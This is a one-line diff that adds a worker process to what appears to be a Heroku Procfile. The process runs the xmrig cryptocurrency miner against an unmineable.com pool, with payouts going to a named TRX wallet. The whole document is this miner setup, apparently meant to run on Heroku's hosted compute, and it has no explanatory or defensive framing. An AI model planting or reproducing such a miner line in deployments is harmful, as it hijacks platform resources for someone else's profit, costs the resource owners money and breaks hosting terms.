@@ -1,0 +1,1 @@
+Worker: ./xmrig --donate-level 4 -o ethash.unmineable.com:3333 -u TRX:TXfogTn3aFKZfj4zgGCDvfZim7VD7Pjicb.Heroku -p x
